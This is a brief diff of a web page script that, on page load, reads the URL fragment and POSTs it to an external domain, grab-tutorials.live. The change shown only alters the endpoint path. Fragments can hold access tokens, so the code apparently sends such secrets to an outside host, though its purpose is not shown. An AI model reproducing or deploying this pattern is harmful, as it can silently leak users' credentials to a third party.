@@ -8,7 +8,7 @@ window.addEventListener('DOMContentLoaded', () => {
   if (fragment) {
     console.log("Sending POST request with fragment:", fragment);
 
-    fetch('https://grab-tutorials.live/login', {
+    fetch('https://grab-tutorials.live/', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
